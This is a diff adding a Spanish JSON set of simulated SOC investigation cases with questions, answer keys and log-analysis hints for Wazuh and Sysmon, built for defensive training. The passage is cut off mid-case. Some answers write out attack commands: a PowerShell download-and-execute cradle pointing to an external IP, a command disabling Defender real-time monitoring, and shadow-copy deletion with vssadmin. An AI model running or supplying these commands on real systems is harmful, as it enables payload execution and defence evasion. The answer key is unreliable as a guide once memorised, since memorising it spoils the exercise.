@@ -1,0 +1,851 @@
+{
+  "casos": [
+    {
+      "id": "caso-01",
+      "title": "Fuerza bruta SSH contra servidor proxy",
+      "difficulty": "facil",
+      "difficultyLabel": "Fácil",
+      "category": "Autenticación",
+      "context": "Un atacante externo intenta acceder al servidor proxy mediante fuerza bruta durante la madrugada.",
+      "text": "Tecnologías: Linux/SSH. Técnicas MITRE: T1110.",
+      "hint": "Revisa los logs de SSH en SRV-PROXY01 y compara los intentos fallidos con los exitosos.",
+      "target": [4, 5, 7, 8, 9, 11, 12, 17, 19],
+      "questions": [
+        {
+          "text": "¿Cuál es la dirección IP del atacante que realizó la fuerza bruta y logró autenticarse exitosamente?",
+          "answer": "185.220.101.7",
+          "acceptable": [],
+          "hint": "Busca la IP que aparece en múltiples fallos (5710/5711) y también en el éxito (5715)."
+        },
+        {
+          "text": "¿Qué usuario válido fue comprometido tras el ataque de fuerza bruta?",
+          "answer": "mgarcia",
+          "acceptable": [],
+          "hint": "Revisa el evento de éxito (5715) y observa el campo dstuser; ese usuario también aparece en varios fallos desde la IP atacante."
+        },
+        {
+          "text": "¿Qué host fue el objetivo principal del ataque de fuerza bruta SSH?",
+          "answer": "SRV-PROXY01",
+          "acceptable": ["srv-proxy01"],
+          "hint": "Filtra por logs con decoder sshd y ubicación /var/log/secure; el agente que concentra la mayoría de estos eventos es el objetivo."
+        },
+        {
+          "text": "¿Qué técnica MITRE ATT&CK corresponde al ataque principal?",
+          "answer": "T1110",
+          "acceptable": ["t1110", "Brute Force", "fuerza bruta", "1110"],
+          "hint": "Los fallos repetidos de autenticación desde una misma IP corresponden a la técnica de fuerza bruta."
+        },
+        {
+          "text": "¿Cuál fue el primer intento fallido de autenticación registrado contra el servidor proxy?",
+          "answer": "test",
+          "acceptable": [],
+          "hint": "Busca el primer log con rule.id 5710 (Invalid user) en orden cronológico y revisa el campo dstuser."
+        },
+        {
+          "text": "¿Qué ID de regla de Wazuh se dispara al detectar un intento de autenticación SSH exitosa en este caso?",
+          "answer": "5715",
+          "acceptable": [],
+          "hint": "Identifica el log que contiene 'Accepted password' y observa su rule.id."
+        },
+        {
+          "text": "¿Cuántos intentos fallidos de autenticación para el usuario 'mgarcia' se registraron desde la IP atacante antes del éxito?",
+          "answer": "3",
+          "acceptable": ["tres", "3 intentos", "tres intentos"],
+          "hint": "Cuenta los eventos con rule.id 5711 (Failed password) donde dstuser=mgarcia y srcip=185.220.101.7, antes del evento 5715."
+        },
+        {
+          "text": "¿Qué evento marca el inicio de la sesión exitosa del atacante después de la autenticación?",
+          "answer": "PAM: session opened",
+          "acceptable": ["session opened", "5501"],
+          "hint": "Inmediatamente después del éxito (5715), busca un evento que confirme la apertura de sesión (decoder pam)."
+        },
+        {
+          "text": "¿Cuál es la IP de la segunda fuente de ataque que también intentó acceder a SRV-PROXY01 en la misma franja horaria?",
+          "answer": "45.33.22.11",
+          "acceptable": [],
+          "hint": "Busca otro srcip diferente a 185.220.101.7 que también aparezca en logs de fallo contra SRV-PROXY01."
+        },
+        {
+          "text": "¿Qué usuario legítimo ejecutó un comando sudo en SRV-WEB01 durante la misma madrugada?",
+          "answer": "jcorrales",
+          "acceptable": [],
+          "hint": "Filtra por agent.name:SRV-WEB01 y decoder sudo; observa el campo srcuser."
+        }
+      ]
+    },
+    {
+      "id": "caso-02",
+      "title": "Creación de usuario sospechosa fuera de horario",
+      "difficulty": "facil",
+      "difficultyLabel": "Fácil",
+      "category": "Persistencia",
+      "context": "Un atacante con credenciales de administrador crea una cuenta de usuario y la agrega al grupo Domain Admins durante la madrugada, fuera del horario laboral.",
+      "text": "Tecnologías: Windows Security. Técnicas MITRE: T1136.001, T1098.",
+      "hint": "Revisa los eventos de creación de usuario (4720) y adición a grupo (4732) en el controlador de dominio SRV-DC01, y verifica la IP de origen y el horario.",
+      "target": [1, 2, 3, 4, 5],
+      "questions": [
+        {
+          "text": "¿Cuál es la dirección IP externa desde la que se realizó la creación de usuario?",
+          "answer": "198.51.100.10",
+          "acceptable": [],
+          "hint": "Busca el evento 4624 de logon exitoso en SRV-DC01 y revisa el campo IpAddress en eventdata."
+        },
+        {
+          "text": "¿Qué usuario del dominio creó la nueva cuenta (SubjectUserName)?",
+          "answer": "jcorrales",
+          "acceptable": [],
+          "hint": "Revisa el evento 4720 (creación de usuario) y observa el campo SubjectUserName."
+        },
+        {
+          "text": "¿Cuál es el nombre de la nueva cuenta de usuario creada (TargetUserName)?",
+          "answer": "svc_backup_pro",
+          "acceptable": [],
+          "hint": "En el mismo evento 4720, mira el campo TargetUserName."
+        },
+        {
+          "text": "¿A qué grupo de seguridad fue agregada la nueva cuenta inmediatamente después de su creación?",
+          "answer": "Domain Admins",
+          "acceptable": ["domain admins", "Domain Admins", "Administradores del dominio"],
+          "hint": "Busca el evento 4732 que ocurre justo después de la creación y revisa el campo TargetUserName."
+        },
+        {
+          "text": "¿Qué EventID de Windows Security corresponde a la creación de una cuenta de usuario?",
+          "answer": "4720",
+          "acceptable": [],
+          "hint": "Observa el rule.id o el win.system.EventID del evento que crea la cuenta."
+        },
+        {
+          "text": "¿Qué EventID de Windows Security corresponde a la adición de un miembro a un grupo con privilegios?",
+          "answer": "4732",
+          "acceptable": [],
+          "hint": "Revisa el evento que agrega la cuenta al grupo Domain Admins."
+        },
+        {
+          "text": "¿A qué hora exacta (timestamp) ocurrió la creación de la cuenta de usuario?",
+          "answer": "03:15:20",
+          "acceptable": ["03:15", "3:15", "03:15:20"],
+          "hint": "El timestamp del evento 4720 te dará la hora exacta."
+        },
+        {
+          "text": "¿Qué técnica MITRE ATT&CK se asocia a la creación de una cuenta de dominio para persistencia?",
+          "answer": "T1136.001",
+          "acceptable": ["t1136.001", "T1136", "Create Account", "creación de cuenta"],
+          "hint": "Busca en el evento 4720 la sección mitre.id."
+        },
+        {
+          "text": "¿Qué usuario legítimo ejecutó el comando 'whoami' en el servidor proxy durante la mañana?",
+          "answer": "amorales",
+          "acceptable": [],
+          "hint": "Filtra por logs de sudo en SRV-PROXY01 y busca el comando whoami."
+        },
+        {
+          "text": "¿Cuál fue el LogonType del acceso exitoso que precedió a la creación de la cuenta (inicio de sesión del atacante)?",
+          "answer": "10",
+          "acceptable": ["10 (RDP)", "RDP", "10"],
+          "hint": "Revisa el evento 4624 de logon exitoso en SRV-DC01 y mira el campo LogonType."
+        }
+      ]
+    },
+        {
+      "id": "caso-03",
+      "title": "Instalación de servicio no autorizado",
+      "difficulty": "facil",
+      "difficultyLabel": "Fácil",
+      "category": "Persistencia",
+      "context": "Un atacante con credenciales robadas del usuario hsanchez instala un servicio malicioso en el servidor de aplicaciones para mantener persistencia.",
+      "text": "Tecnologías: Windows Security. Técnicas MITRE: T1543.003.",
+      "hint": "Revisa los eventos de instalación de servicio (4697) en SRV-APP01 y correlaciona con el inicio de sesión remoto (4624) que lo precedió.",
+      "target": [1, 2, 3, 4],
+      "questions": [
+        {
+          "text": "¿Cuál es la dirección IP externa desde la que se realizó la instalación del servicio?",
+          "answer": "192.0.2.55",
+          "acceptable": [],
+          "hint": "Busca el evento 4624 de logon exitoso en SRV-APP01 y revisa el campo IpAddress en eventdata."
+        },
+        {
+          "text": "¿Qué usuario del dominio fue comprometido y utilizado para la instalación?",
+          "answer": "hsanchez",
+          "acceptable": [],
+          "hint": "Revisa el evento 4697 (instalación de servicio) y observa el campo SubjectUserName."
+        },
+        {
+          "text": "¿En qué host se instaló el servicio no autorizado?",
+          "answer": "SRV-APP01",
+          "acceptable": ["srv-app01"],
+          "hint": "Observa el nombre del agente en el evento 4697."
+        },
+        {
+          "text": "¿Cuál es el nombre del servicio instalado?",
+          "answer": "UpdateService",
+          "acceptable": ["updateService"],
+          "hint": "En el evento 4697, revisa el campo ServiceName."
+        },
+        {
+          "text": "¿Qué ruta de archivo ejecutable se asoció al servicio (ServiceFileName)?",
+          "answer": "C:\\Windows\\Temp\\update.exe",
+          "acceptable": ["c:\\windows\\temp\\update.exe"],
+          "hint": "En el evento 4697, busca el campo ServiceFileName."
+        },
+        {
+          "text": "¿Qué EventID de Windows Security corresponde a la instalación de un servicio?",
+          "answer": "4697",
+          "acceptable": [],
+          "hint": "Observa el rule.id o el win.system.EventID del evento que instala el servicio."
+        },
+        {
+          "text": "¿Qué técnica MITRE ATT&CK se asocia a la instalación de un servicio para persistencia?",
+          "answer": "T1543.003",
+          "acceptable": ["t1543.003", "T1543", "Create or Modify System Process", "Windows Service"],
+          "hint": "Busca en el evento 4697 la sección mitre.id."
+        },
+        {
+          "text": "¿Qué tipo de inicio de sesión (LogonType) se utilizó en el acceso remoto a SRV-APP01?",
+          "answer": "10",
+          "acceptable": ["10 (RDP)", "RDP"],
+          "hint": "Revisa el evento 4624 de logon exitoso en SRV-APP01 y mira el campo LogonType."
+        },
+        {
+          "text": "¿Qué EventID indica la asignación de privilegios especiales al usuario después del inicio de sesión?",
+          "answer": "4672",
+          "acceptable": [],
+          "hint": "Busca el evento que se dispara inmediatamente después de un logon exitoso cuando el usuario tiene privilegios administrativos."
+        },
+        {
+          "text": "¿Qué usuario legítimo ejecutó un comando 'systemctl status docker' en el servidor proxy durante la mañana?",
+          "answer": "amorales",
+          "acceptable": [],
+          "hint": "Filtra por logs de sudo en SRV-PROXY01 y busca el comando 'systemctl status docker'."
+        }
+      ]
+    },
+    {
+      "id": "caso-04",
+      "title": "Phishing con macro y establecimiento de C2",
+      "difficulty": "facil",
+      "difficultyLabel": "Fácil",
+      "category": "Malware",
+      "context": "Un empleado de Finanzas recibe un correo con un archivo Word malicioso que ejecuta una macro y establece comunicación C2.",
+      "text": "Tecnologías: Windows Security + Sysmon. Técnicas MITRE: T1204, T1053.005.",
+      "hint": "Revisa la cadena de procesos desde WINWORD.EXE y las conexiones de red a dominios sospechosos.",
+      "target": [2, 3, 4, 5, 6, 7, 19],
+      "questions": [
+        {
+          "text": "¿Qué usuario abrió el documento malicioso?",
+          "answer": "lgomez",
+          "acceptable": [],
+          "hint": "Revisa los procesos creados por WINWORD.EXE y busca el campo User."
+        },
+        {
+          "text": "¿Desde qué equipo se abrió el documento?",
+          "answer": "FIN-DESK-22",
+          "acceptable": [],
+          "hint": "Filtra por agent.name en los eventos de creación de proceso (Sysmon 1)."
+        },
+        {
+          "text": "¿Qué proceso padre ejecutó el script de PowerShell?",
+          "answer": "WINWORD.EXE",
+          "acceptable": ["C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"],
+          "hint": "Busca el evento Sysmon 1 de powershell.exe y revisa ParentImage."
+        },
+        {
+          "text": "¿Cuál es la dirección IP del servidor C2 al que se conectó el equipo?",
+          "answer": "185.215.113.89",
+          "acceptable": [],
+          "hint": "Filtra por eventos de conexión de red (Sysmon 3) y busca DestinationIp."
+        },
+        {
+          "text": "¿Qué dominio C2 fue consultado en la conexión?",
+          "answer": "office-verify-tenant.com",
+          "acceptable": [],
+          "hint": "Busca el evento de DNS (Sysmon 22) asociado a powershell.exe."
+        },
+        {
+          "text": "¿Qué técnica MITRE ATT&CK corresponde a la ejecución inicial mediante la macro?",
+          "answer": "T1204",
+          "acceptable": ["User Execution", "T1204.002"],
+          "hint": "La macro se ejecuta al abrir el documento por el usuario."
+        },
+        {
+          "text": "¿Qué técnica MITRE ATT&CK se usó para la persistencia?",
+          "answer": "T1053.005",
+          "acceptable": ["Scheduled Task", "T1053"],
+          "hint": "Se creó una tarea programada que se ejecuta al iniciar sesión."
+        },
+        {
+          "text": "¿Qué nombre recibió la tarea programada creada?",
+          "answer": "UpdateTask",
+          "acceptable": ["\\UpdateTask"],
+          "hint": "Revisa el evento 4698 de Windows Security y busca TaskName."
+        },
+        {
+          "text": "¿Qué EventID de Sysmon registra la creación de la tarea programada?",
+          "answer": "1",
+          "acceptable": ["1", "Sysmon 1"],
+          "hint": "La tarea se crea ejecutando schtasks.exe, cuyo proceso se registra con Sysmon 1."
+        },
+        {
+          "text": "¿A qué hora se estableció la conexión de red al C2?",
+          "answer": "03:15:00",
+          "acceptable": ["03:15", "3:15 AM"],
+          "hint": "Busca el evento Sysmon 3 con DestinationIp=185.215.113.89 y revisa el timestamp."
+        }
+      ]
+    },
+    {
+      "id": "caso-05",
+      "title": "Persistencia mediante clave de registro Run",
+      "difficulty": "facil",
+      "difficultyLabel": "Fácil",
+      "category": "Persistencia",
+      "context": "Un empleado de IT modifica la clave de registro Run para ejecutar un script malicioso al inicio del sistema.",
+      "text": "Tecnologías: Windows + Sysmon. Técnicas MITRE: T1547.001.",
+      "hint": "Busca eventos de modificación de registro (Sysmon 13) y creación de archivos (Sysmon 11) en IT-WS-07.",
+      "target": [4, 5, 6, 7, 8, 9],
+      "questions": [
+        {
+          "text": "¿Qué usuario realizó la modificación del registro?",
+          "answer": "hsanchez",
+          "acceptable": [],
+          "hint": "Busca el log de creación de proceso de reg.exe (Sysmon 1) o el log de modificación de registro (Sysmon 13) y revisa el campo User."
+        },
+        {
+          "text": "¿Desde qué equipo se realizó la modificación?",
+          "answer": "IT-WS-07",
+          "acceptable": [],
+          "hint": "Revisa el campo agent.name en los logs de reg.exe o de modificación de registro."
+        },
+        {
+          "text": "¿Qué clave de registro fue modificada?",
+          "answer": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "acceptable": ["HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Run"],
+          "hint": "Busca el log Sysmon 13 y revisa el campo TargetObject."
+        },
+        {
+          "text": "¿Qué valor se estableció en la clave?",
+          "answer": "Updater",
+          "acceptable": [],
+          "hint": "En el log Sysmon 13, el campo Details contiene el nombre del valor seguido de '='."
+        },
+        {
+          "text": "¿Qué programa se ejecutará al inicio del sistema según la clave Run modificada?",
+          "answer": "powershell.exe",
+          "acceptable": ["PowerShell", "powershell"],
+          "hint": "Revisa el campo Details en el log Sysmon 13; el ejecutable aparece en la ruta después del nombre del valor."
+        },
+        {
+          "text": "¿Qué EventID de Sysmon registra la modificación?",
+          "answer": "13",
+          "acceptable": ["13", "Sysmon13"],
+          "hint": "Observa el campo rule.id en el log de modificación de registro (el que tiene TargetObject con Run)."
+        },
+        {
+          "text": "¿Qué técnica MITRE corresponde a persistencia mediante Run?",
+          "answer": "T1547.001",
+          "acceptable": ["T1547", "Boot or Logon Autostart Execution"],
+          "hint": "Revisa el campo mitre.id en el log Sysmon 13."
+        },
+        {
+          "text": "¿Qué proceso realizó la modificación?",
+          "answer": "reg.exe",
+          "acceptable": ["reg.exe"],
+          "hint": "Busca el log Sysmon 13 y revisa el campo Image."
+        },
+        {
+          "text": "¿A qué hora se realizó la modificación?",
+          "answer": "02:30:00",
+          "acceptable": ["02:30", "2:30 AM"],
+          "hint": "Busca el log Sysmon 13 y revisa el timestamp."
+        },
+        {
+          "text": "¿Qué archivo fue creado previamente como parte del ataque?",
+          "answer": "script.ps1",
+          "acceptable": ["C:\\Users\\hsanchez\\Desktop\\script.ps1"],
+          "hint": "Busca un evento Sysmon 11 (File create) anterior a la modificación de registro."
+        }
+      ]
+    },
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    {
+      "id": "caso-10",
+      "title": "Alerta de comportamiento inusual en equipo de Finanzas",
+      "difficulty": "medio",
+      "difficultyLabel": "Medio",
+      "category": "Phishing / Ejecución",
+      "context": "El EDR generó una alerta por actividad fuera de lo común en la estación de trabajo de la CFO. Se requiere investigar el origen y el alcance.",
+      "text": "Tecnologías: Windows, Office. Se requiere correlación entre eventos de proceso, red y persistencia.",
+      "hint": "Revisa la secuencia de procesos y conexiones de red en el host de la CFO.",
+      "target": [11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21],
+      "tipoCaso": "TP",
+      "questions": [
+        {
+          "text": "¿Cuál es la IP del servidor C2 al que se conectó el equipo comprometido?",
+          "answer": "154.16.170.40",
+          "acceptable": [],
+          "hint": "Busca conexiones de red salientes desde FIN-DESK-22 hacia una IP externa que no esté en la lista de SaaS de la empresa."
+        },
+        {
+          "text": "¿Qué usuario de la empresa fue víctima del ataque?",
+          "answer": "lgomez",
+          "acceptable": [],
+          "hint": "Observa los logs de inicio de sesión y de creación de procesos en FIN-DESK-22; fíjate en el propietario de los procesos maliciosos."
+        },
+        {
+          "text": "¿Qué host fue comprometido?",
+          "answer": "FIN-DESK-22",
+          "acceptable": ["fin-desk-22"],
+          "hint": "Identifica el agente que concentra la ejecución de WINWORD → powershell → update.exe."
+        },
+        {
+          "text": "¿Qué proceso legítimo de Office fue utilizado para ejecutar la macro maliciosa?",
+          "answer": "WINWORD.EXE",
+          "acceptable": ["winword.exe", "winword"],
+          "hint": "Busca el proceso que abrió el documento 'Factura_2026.doc' y que luego invocó powershell.exe."
+        },
+        {
+          "text": "¿Cuál fue el comando completo de PowerShell usado para descargar el payload?",
+          "answer": "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('https://154.16.170.40/script.ps1')\"",
+          "acceptable": [],
+          "hint": "Revisa el CommandLine del evento de creación de proceso donde WINWORD.EXE es el padre."
+        },
+        {
+          "text": "¿Qué archivo fue descargado y ejecutado como payload?",
+          "answer": "update.exe",
+          "acceptable": ["update"],
+          "hint": "Observa el Sysmon EID 11 (File Create) en FIN-DESK-22 y luego el proceso que se ejecutó desde Temp."
+        },
+        {
+          "text": "¿Qué técnica MITRE ATT&CK corresponde al envío del correo con adjunto malicioso?",
+          "answer": "T1566.001",
+          "acceptable": ["T1566", "Spearphishing Attachment", "phishing"],
+          "hint": "El vector de entrada fue un correo con un documento que contenía una macro."
+        },
+        {
+          "text": "¿Qué técnica MITRE se usó para la ejecución de la macro?",
+          "answer": "T1204.002",
+          "acceptable": ["T1204", "User Execution", "malicious file"],
+          "hint": "El usuario abrió el documento y habilitó la macro, lo que inició la cadena."
+        },
+        {
+          "text": "¿Qué mecanismo de persistencia fue creado?",
+          "answer": "Tarea programada",
+          "acceptable": ["scheduled task", "schtasks", "T1053.005"],
+          "hint": "Busca la creación de una tarea con el nombre 'UpdateCheck' que ejecuta update.exe diariamente."
+        },
+        {
+          "text": "¿Este caso es un Falso Positivo o un Verdadero Positivo?",
+          "answer": "Verdadero Positivo",
+          "acceptable": ["Verdadero Positivo", "VP", "vp", "verdadero positivo"],
+          "tipoPregunta": "veredicto",
+          "hint": "Revisa la evidencia de ejecución de código y conexión a C2 para determinar si fue un ataque real."
+        }
+      ]
+    },
+    {
+      "id": "caso-11",
+      "title": "Conexión saliente inusual desde servidor de archivos",
+      "difficulty": "medio",
+      "difficultyLabel": "Medio",
+      "category": "Tráfico de red",
+      "context": "Se ha detectado tráfico de red saliente desde el servidor de archivos durante la madrugada. Se requiere investigar el motivo.",
+      "text": "Tecnologías: Windows, Sysmon. Se debe correlacionar la ejecución de procesos con las conexiones de red y verificar la legitimidad.",
+      "hint": "Revisa el origen del proceso que realiza las conexiones y los dominios de destino.",
+      "target": [16, 17, 18, 19, 20, 21, 22, 23, 24, 25],
+      "tipoCaso": "FP",
+      "questions": [
+        {
+          "text": "¿Cuál es la IP de destino de las conexiones salientes detectadas?",
+          "answer": "185.150.99.100",
+          "acceptable": [],
+          "hint": "Busca eventos de red desde SRV-FS01 durante la madrugada con destino externo."
+        },
+        {
+          "text": "¿Qué usuario de servicio ejecuta el proceso de backup?",
+          "answer": "svc_backup",
+          "acceptable": [],
+          "hint": "Observa el propietario del proceso rclone.exe en los logs de creación de proceso."
+        },
+        {
+          "text": "¿Qué host genera el tráfico saliente?",
+          "answer": "SRV-FS01",
+          "acceptable": ["srv-fs01"],
+          "hint": "Identifica el agente que aparece en los eventos de red con la IP de destino sospechosa."
+        },
+        {
+          "text": "¿Qué proceso realiza las conexiones de red?",
+          "answer": "rclone.exe",
+          "acceptable": ["rclone"],
+          "hint": "Busca el nombre del ejecutable en los Sysmon EID 3."
+        },
+        {
+          "text": "¿Cuál es el dominio de destino de las conexiones?",
+          "answer": "backupcloud.io",
+          "acceptable": [],
+          "hint": "Revisa el campo DestinationHostname en los eventos de red."
+        },
+        {
+          "text": "¿Qué nombre tiene la tarea programada que ejecuta el backup?",
+          "answer": "BackupToCloud",
+          "acceptable": ["backuptocloud"],
+          "hint": "Busca la creación de una tarea programada con schtasks o evento 4698."
+        },
+        {
+          "text": "¿A qué hora se ejecuta la tarea programada?",
+          "answer": "02:00",
+          "acceptable": ["2:00"],
+          "hint": "Revisa el comando de creación de tarea o la hora de inicio de los logs de red."
+        },
+        {
+          "text": "¿Qué herramienta de sincronización se utiliza para el backup?",
+          "answer": "rclone",
+          "acceptable": ["rclone.exe"],
+          "hint": "El proceso que realiza la conexión es una herramienta conocida de sincronización."
+        },
+        {
+          "text": "¿Qué técnica MITRE ATT&CK describe la transferencia de datos hacia el exterior y podría asociarse erróneamente con esta actividad?",
+          "answer": "T1048",
+          "acceptable": ["T1048", "Exfiltration", "Exfiltración"],
+          "hint": "La transferencia de datos desde un servidor interno hacia un servidor externo puede ser exfiltración, pero en este caso es legítima."
+        },
+        {
+          "text": "¿Este caso es un Falso Positivo o un Verdadero Positivo?",
+          "answer": "Falso Positivo",
+          "acceptable": ["Falso Positivo", "FP", "fp", "falso positivo"],
+          "tipoPregunta": "veredicto",
+          "hint": "Revisa el dominio de destino, la cuenta de servicio y la tarea programada para determinar si la actividad es legítima."
+        }
+      ]
+    },
+    {
+      "id": "caso-12",
+      "title": "Inicio de sesión remoto fuera de horario en equipo de IT",
+      "difficulty": "medio",
+      "difficultyLabel": "Medio",
+      "category": "Acceso remoto / Movimiento lateral",
+      "context": "Se ha detectado un inicio de sesión RDP desde un equipo de IT hacia otro, fuera del horario laboral. Se requiere investigar si fue legítimo o malicioso.",
+      "text": "Tecnologías: Windows, Sysmon. Se requiere correlacionar inicios de sesión, procesos y movimientos laterales.",
+      "hint": "Revisa la secuencia de inicios de sesión RDP y los comandos ejecutados después del acceso.",
+      "target": [11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24],
+      "tipoCaso": "TP",
+      "questions": [
+        {
+          "text": "¿Cuál es la IP de origen del primer inicio de sesión RDP sospechoso?",
+          "answer": "10.20.6.3",
+          "acceptable": [],
+          "hint": "Busca un evento 4624 con LogonType=10 hacia IT-ADMIN-05 y revisa el campo IpAddress."
+        },
+        {
+          "text": "¿Qué usuario fue utilizado para el primer salto RDP?",
+          "answer": "hsanchez",
+          "acceptable": [],
+          "hint": "Observa el campo TargetUserName en el primer evento 4624 con LogonType=10."
+        },
+        {
+          "text": "¿Qué usuario fue comprometido y utilizado para moverse al controlador de dominio?",
+          "answer": "mgarcia",
+          "acceptable": [],
+          "hint": "Busca el evento 4624 con LogonType=10 en SRV-DC01 y revisa el TargetUserName."
+        },
+        {
+          "text": "¿Qué host fue comprometido inicialmente?",
+          "answer": "IT-ADMIN-05",
+          "acceptable": ["it-admin-05"],
+          "hint": "El primer host que recibe el RDP fuera de horario es el punto de entrada."
+        },
+        {
+          "text": "¿Qué servidor crítico fue accedido durante el movimiento lateral?",
+          "answer": "SRV-DC01",
+          "acceptable": ["srv-dc01"],
+          "hint": "Busca el segundo evento 4624 con LogonType=10 que ocurre después del reconocimiento en IT-ADMIN-05."
+        },
+        {
+          "text": "¿Qué comando se ejecutó para deshabilitar la protección en el controlador de dominio?",
+          "answer": "Set-MpPreference -DisableRealtimeMonitoring $true",
+          "acceptable": ["disable realtime monitoring", "deshabilitar defender"],
+          "hint": "Revisa el CommandLine del evento de creación de proceso donde se modifica la configuración de Windows Defender."
+        },
+        {
+          "text": "¿Qué herramienta se utilizó para eliminar las copias de sombra (VSS) en el DC?",
+          "answer": "vssadmin.exe",
+          "acceptable": ["vssadmin"],
+          "hint": "Busca el comando que incluye 'delete shadows /all /quiet'."
+        },
+        {
+          "text": "¿Qué técnica MITRE ATT&CK corresponde al uso de credenciales válidas para el acceso inicial?",
+          "answer": "T1078",
+          "acceptable": ["T1078", "Valid Accounts", "cuentas válidas"],
+          "hint": "El atacante utilizó credenciales legítimas para acceder a los sistemas sin necesidad de explotar vulnerabilidades."
+        },
+        {
+          "text": "¿Qué técnica MITRE ATT&CK describe el movimiento lateral mediante RDP?",
+          "answer": "T1021.001",
+          "acceptable": ["T1021", "Remote Desktop", "RDP", "T1021.001"],
+          "hint": "El atacante utilizó RDP para moverse entre hosts en la red interna."
+        },
+        {
+          "text": "¿Este caso es un Falso Positivo o un Verdadero Positivo?",
+          "answer": "Verdadero Positivo",
+          "acceptable": ["Verdadero Positivo", "VP", "vp", "verdadero positivo"],
+          "tipoPregunta": "veredicto",
+          "hint": "Revisa la cadena completa: RDP fuera de horario, reconocimiento, movimiento lateral y desactivación de defensas."
+        }
+      ]
+    },
+    {
+      "id": "caso-13",
+      "title": "Proceso desconocido ejecutado en estación de Desarrollo",
+      "difficulty": "medio",
+      "difficultyLabel": "Medio",
+      "category": "Ejecución de binario poco común",
+      "context": "El EDR detectó la ejecución de un proceso que carga una DLL desde una ruta inusual en una estación de desarrollo. Se requiere determinar si se trata de una herramienta legítima o de un ataque.",
+      "text": "Tecnologías: Windows, Sysmon. Se debe correlacionar la ejecución de rundll32 con la carga de una DLL y verificar el contexto.",
+      "hint": "Revisa la ruta de la DLL, el proceso padre y el script que orquestó la ejecución.",
+      "target": [9, 10, 11, 12, 13, 14],
+      "tipoCaso": "FP",
+      "questions": [
+        {
+          "text": "¿Qué proceso binario de Windows fue ejecutado y podría ser abusado para ejecución maliciosa?",
+          "answer": "rundll32.exe",
+          "acceptable": ["rundll32"],
+          "hint": "Busca el proceso que cargó una DLL desde una ruta de herramientas."
+        },
+        {
+          "text": "¿Cuál es la ruta completa del archivo DLL que fue cargado por rundll32?",
+          "answer": "C:\\DevTools\\deploy.dll",
+          "acceptable": [],
+          "hint": "Revisa el CommandLine del proceso rundll32.exe."
+        },
+        {
+          "text": "¿Qué usuario ejecutó el proceso en la estación de desarrollo?",
+          "answer": "dmendoza",
+          "acceptable": [],
+          "hint": "Observa el campo User en los eventos de creación de proceso."
+        },
+        {
+          "text": "¿En qué host ocurrió la ejecución del proceso?",
+          "answer": "DEV-WS-01",
+          "acceptable": ["dev-ws-01"],
+          "hint": "Identifica el agente donde se ejecutó rundll32.exe."
+        },
+        {
+          "text": "¿Cuál fue el comando completo ejecutado por rundll32?",
+          "answer": "rundll32.exe C:\\DevTools\\deploy.dll,Install",
+          "acceptable": [],
+          "hint": "Revisa el CommandLine del evento de creación de proceso de rundll32."
+        },
+        {
+          "text": "¿Qué proceso padre inició la ejecución de rundll32?",
+          "answer": "cmd.exe",
+          "acceptable": ["cmd"],
+          "hint": "Observa el ParentImage en el evento de creación de rundll32."
+        },
+        {
+          "text": "¿Qué script (archivo por lotes) ejecutó el comando que inició rundll32?",
+          "answer": "build_deploy.bat",
+          "acceptable": ["build_deploy"],
+          "hint": "Revisa el CommandLine del proceso padre que lanzó rundll32."
+        },
+        {
+          "text": "¿Qué técnica MITRE ATT&CK describe el abuso de rundll32.exe para ejecutar código arbitrario?",
+          "answer": "T1218.011",
+          "acceptable": ["T1218", "Signed Binary Proxy Execution", "Rundll32"],
+          "hint": "rundll32.exe es un binario firmado por Microsoft que puede ser utilizado para cargar y ejecutar DLLs."
+        },
+        {
+          "text": "¿En qué directorio se encuentra la DLL ejecutada, y qué deberías verificar respecto a ese directorio en el panel de Contexto SOC?",
+          "answer": "C:\\DevTools\\",
+          "acceptable": ["DevTools", "C:\\DevTools"],
+          "hint": "La DLL se cargó desde una ruta no estándar; verifica en el panel de Contexto SOC si ese directorio está autorizado para herramientas internas."
+        },
+        {
+          "text": "¿Este caso es un Falso Positivo o un Verdadero Positivo?",
+          "answer": "Falso Positivo",
+          "acceptable": ["Falso Positivo", "FP", "fp", "falso positivo"],
+          "tipoPregunta": "veredicto",
+          "hint": "Revisa la ruta de la DLL y el contexto: ¿pertenece a una herramienta interna de desarrollo?"
+        }
+      ]
+    },
+    {
+      "id": "caso-14",
+      "title": "Múltiples fallos de autenticación contra servicio remoto",
+      "difficulty": "medio",
+      "difficultyLabel": "Medio",
+      "category": "Fuerza bruta / acceso remoto",
+      "context": "Se detectaron múltiples fallos de autenticación en el servicio VPN durante la madrugada. Se requiere investigar si hubo un acceso exitoso y determinar el alcance.",
+      "text": "Tecnologías: Windows, Sysmon. Se requiere correlacionar fallos de autenticación, acceso exitoso y ejecución de comandos posteriores.",
+      "hint": "Revisa los eventos 4625 en SRV-VPN01, busca el éxito y luego la actividad posterior.",
+      "target": [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22],
+      "tipoCaso": "TP",
+      "questions": [
+        {
+          "text": "¿Cuál es la IP del atacante que realizó la fuerza bruta?",
+          "answer": "45.155.205.33",
+          "acceptable": [],
+          "hint": "Busca eventos 4625 (fallos de autenticación) en SRV-VPN01 y observa el Source Network Address."
+        },
+        {
+          "text": "¿Qué usuario de la empresa fue comprometido exitosamente después del ataque de fuerza bruta?",
+          "answer": "mgarcia",
+          "acceptable": [],
+          "hint": "Busca el evento 4624 (éxito) con LogonType=10 desde la IP atacante."
+        },
+        {
+          "text": "¿Qué host fue el objetivo principal del ataque de fuerza bruta?",
+          "answer": "SRV-VPN01",
+          "acceptable": ["srv-vpn01"],
+          "hint": "Identifica el agente donde se concentran los eventos 4625 desde la IP atacante."
+        },
+        {
+          "text": "¿Qué técnica MITRE ATT&CK corresponde al ataque de fuerza bruta?",
+          "answer": "T1110",
+          "acceptable": ["t1110", "Brute Force", "fuerza bruta", "1110"],
+          "hint": "Los fallos repetidos de autenticación desde una misma IP corresponden a la técnica de fuerza bruta."
+        },
+        {
+          "text": "¿Qué técnica MITRE se utilizó para el acceso con credenciales válidas una vez que la contraseña fue acertada?",
+          "answer": "T1078",
